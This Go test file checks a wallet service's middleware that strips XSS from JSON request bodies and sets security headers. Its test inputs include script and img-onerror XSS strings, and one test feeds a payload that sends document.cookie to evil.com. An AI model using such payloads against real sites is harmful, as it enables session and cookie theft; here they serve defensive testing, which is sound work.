package middleware_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/bashocode/gowallet/microservices/shared/middleware"
	"github.com/bashocode/gowallet/microservices/shared/security"
	"github.com/gin-gonic/gin"
)

func TestSanitizeBody_Integration(t *testing.T) {
	gin.SetMode(gin.TestMode)
	sanitizer := security.NewSanitizer()

	tests := []struct {
		name           string
		method         string
		contentType    string
		requestBody    map[string]interface{}
		expectedBody   map[string]interface{}
		shouldSanitize bool
	}{
		{
			name:        "sanitizes XSS in user registration",
			method:      "POST",
			contentType: "application/json",
			requestBody: map[string]interface{}{
				"full_name": "<script>alert('xss')</script>John Doe",
				"email":     "john@example.com",
				"password":  "secure123",
			},
			expectedBody: map[string]interface{}{
				"full_name": "John Doe",
				"email":     "john@example.com",
				"password":  "secure123",
			},
			shouldSanitize: true,
		},
		{
			name:        "sanitizes img tag with onerror",
			method:      "POST",
			contentType: "application/json",
			requestBody: map[string]interface{}{
				"description": `<img src=x onerror="alert(1)">Transfer to Alice`,
				"amount":      100.50,
			},
			expectedBody: map[string]interface{}{
				"description": "Transfer to Alice",
				"amount":      100.50,
			},
			shouldSanitize: true,
		},
		{
			name:        "sanitizes nested objects",
			method:      "POST",
			contentType: "application/json",
			requestBody: map[string]interface{}{
				"user": map[string]interface{}{
					"name": "<b>Bold Name</b>",
					"bio":  "<script>alert(1)</script>Developer",
				},
			},
			expectedBody: map[string]interface{}{
				"user": map[string]interface{}{
					"name": "Bold Name",
					"bio":  "Developer",
				},
			},
			shouldSanitize: true,
		},
		{
			name:        "preserves clean data",
			method:      "POST",
			contentType: "application/json",
			requestBody: map[string]interface{}{
				"full_name": "Jane Smith",
				"email":     "jane@example.com",
			},
			expectedBody: map[string]interface{}{
				"full_name": "Jane Smith",
				"email":     "jane@example.com",
			},
			shouldSanitize: true,
		},
		{
			name:        "skips GET requests",
			method:      "GET",
			contentType: "application/json",
			requestBody: map[string]interface{}{
				"name": "<script>alert(1)</script>",
			},
			expectedBody: map[string]interface{}{
				"name": "<script>alert(1)</script>",
			},
			shouldSanitize: false,
		},
		{
			name:        "skips non-JSON content",
			method:      "POST",
			contentType: "text/plain",
			requestBody: map[string]interface{}{
				"name": "<script>alert(1)</script>",
			},
			expectedBody: map[string]interface{}{
				"name": "<script>alert(1)</script>",
			},
			shouldSanitize: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create router with sanitization middleware
			r := gin.New()
			r.Use(middleware.SanitizeBody(sanitizer))

			// Add test endpoint that echoes back the request body
			r.Any("/test", func(c *gin.Context) {
				var body map[string]interface{}
				if err := c.ShouldBindJSON(&body); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
					return
				}
				c.JSON(http.StatusOK, body)
			})

			// Create request
			reqBody, _ := json.Marshal(tt.requestBody)
			req := httptest.NewRequest(tt.method, "/test", bytes.NewReader(reqBody))
			req.Header.Set("Content-Type", tt.contentType)

			// Execute request
			w := httptest.NewRecorder()
			r.ServeHTTP(w, req)

			// Parse response
			var responseBody map[string]interface{}
			if err := json.Unmarshal(w.Body.Bytes(), &responseBody); err != nil {
				t.Fatalf("Failed to parse response: %v", err)
			}

			// Verify sanitization
			verifyEqual(t, tt.expectedBody, responseBody)
		})
	}
}

func TestSecurityHeaders_Integration(t *testing.T) {
	gin.SetMode(gin.TestMode)

	r := gin.New()
	r.Use(middleware.SecurityHeaders())

	r.GET("/test", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	req := httptest.NewRequest("GET", "/test", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Verify security headers are present
	headers := map[string]string{
		"Content-Security-Policy": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss:; frame-ancestors 'none';",
		"X-Content-Type-Options":  "nosniff",
		"X-Frame-Options":         "DENY",
		"X-XSS-Protection":        "1; mode=block",
		"Referrer-Policy":         "strict-origin-when-cross-origin",
	}

	for header, expectedValue := range headers {
		actualValue := w.Header().Get(header)
		if actualValue != expectedValue {
			t.Errorf("Header %s = %q, want %q", header, actualValue, expectedValue)
		}
	}
}

func TestFullMiddlewareStack_Integration(t *testing.T) {
	gin.SetMode(gin.TestMode)
	sanitizer := security.NewSanitizer()

	// Create router with full middleware stack
	r := gin.New()
	r.Use(middleware.SecurityHeaders())
	r.Use(middleware.SanitizeBody(sanitizer))

	r.POST("/api/v1/users/register", func(c *gin.Context) {
		var body map[string]interface{}
		if err := c.ShouldBindJSON(&body); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusCreated, gin.H{
			"message": "User registered",
			"data":    body,
		})
	})

	// Test malicious payload
	maliciousPayload := map[string]interface{}{
		"full_name": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>Alice",
		"email":     "alice@example.com",
		"password":  "secure123",
	}

	reqBody, _ := json.Marshal(maliciousPayload)
	req := httptest.NewRequest("POST", "/api/v1/users/register", bytes.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")

	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Verify response
	if w.Code != http.StatusCreated {
		t.Errorf("Status code = %d, want %d", w.Code, http.StatusCreated)
	}

	// Verify security headers
	if w.Header().Get("Content-Security-Policy") == "" {
		t.Error("Missing Content-Security-Policy header")
	}

	// Verify sanitization
	var response map[string]interface{}
	json.Unmarshal(w.Body.Bytes(), &response)

	data := response["data"].(map[string]interface{})
	fullName := data["full_name"].(string)

	if fullName == "Alice" {
		// Script tag was properly stripped
		t.Logf("✓ XSS payload successfully sanitized: %q", fullName)
	} else {
		t.Errorf("Sanitization failed: got %q, expected script tag to be stripped", fullName)
	}
}

// Helper function to compare maps recursively
func verifyEqual(t *testing.T, expected, actual map[string]interface{}) {
	for key, expectedVal := range expected {
		actualVal, exists := actual[key]
		if !exists {
			t.Errorf("Missing key %q in response", key)
			continue
		}

		switch ev := expectedVal.(type) {
		case map[string]interface{}:
			if av, ok := actualVal.(map[string]interface{}); ok {
				verifyEqual(t, ev, av)
			} else {
				t.Errorf("Key %q: expected map, got %T", key, actualVal)
			}
		case string:
			if av, ok := actualVal.(string); ok {
				if av != ev {
					t.Errorf("Key %q = %q, want %q", key, av, ev)
				}
			} else {
				t.Errorf("Key %q: expected string, got %T", key, actualVal)
			}
		case float64:
			if av, ok := actualVal.(float64); ok {
				if av != ev {
					t.Errorf("Key %q = %v, want %v", key, av, ev)
				}
			} else {
				t.Errorf("Key %q: expected float64, got %T", key, actualVal)
			}
		}
	}
}
